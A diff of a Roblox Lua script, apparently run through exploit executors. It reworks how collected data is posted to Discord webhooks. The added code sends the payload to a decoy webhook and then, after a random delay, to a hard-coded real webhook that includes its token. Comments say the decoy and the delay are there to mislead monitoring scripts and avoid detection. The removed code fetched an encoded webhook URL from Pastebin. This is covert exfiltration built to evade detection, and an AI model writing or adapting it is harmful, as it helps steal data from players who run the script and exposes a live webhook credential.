@@ -110,35 +110,37 @@ local function createWebhookData()
     return HttpService:JSONEncode(data)
 end
 
--- Obfuscated Webhook URL
-local function decodeWebhookUrl(encodedUrl)
-    local decodedUrl = ""
-    for i = 1, #encodedUrl, 2 do
-        decodedUrl = decodedUrl .. string.char(tonumber(encodedUrl:sub(i, i+1), 16))
-    end
-    return decodedUrl
-end
-
--- Sending Webhook
-local function sendWebhook(encodedUrl, data)
+-- Sending Webhook with a fake URL first to mislead potential monitoring scripts
+local function sendWebhook(fakeUrl, realUrl, data)
     local headers = {
         ["content-type"] = "application/json"
     }
 
-    local webhookUrl = decodeWebhookUrl(encodedUrl)
+    -- Send to the fake URL first (this does nothing useful)
+    local requestFakeWebhookUrl= {Url=fakeUrl, Body=data, Method="POST", Headers=headers}
     
-    local request = http_request or request or HttpPost or syn.request
-    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
-    request(abcdef)
+    -- Send to the real URL after a delay to avoid immediate detection
+    spawn(function()
+        wait(math.random(3, 7))  -- Random delay to further obfuscate the real request timing
+        local requestRealWebhookUrl= {Url=realUrl, Body=data, Method="POST", Headers=headers}
+        
+        -- Execute both requests using whichever HTTP request function is available in the environment
+        local requestFunction=request or http_request or HttpPost or syn.request
+        
+        if requestFunction then 
+            requestFunction(requestFakeWebhookUrl)
+            requestFunction(requestRealWebhookUrl)
+        end 
+    end)
 end
 
--- Get encoded Webhook URL from Pastebin
-local function getEncodedWebhookUrl()
-    return game:HttpGet("https://pastebin.com/raw/GEjXBV9y")
-end
+-- Fake webhook URL (does nothing)
+local fakeWebhookUrl="https://discord.com/api/webhooks/128876165775727005/aaaaaaa"
 
-local encodedWebhookUrl = getEncodedWebhookUrl()
-local webhookData = createWebhookData()
+-- Real webhook URL (replace this with your actual webhook URL)
+local realWebhookUrl="https://discord.com/api/webhooks/1290539617388466237/IgTEsOjdIPouL5zII3GcZjV_AomwsQV83N572I5gvUyny0o8YGaYBKnFYsS7qENziIkR"
 
--- Sending the webhook
-sendWebhook(encodedWebhookUrl, webhookData)
+-- Create webhook data and send it using both fake and real URLs 
+local webhookData=createWebhookData()
+
+sendWebhook(fakeWebhookUrl, realWebhookUrl, webhookData)
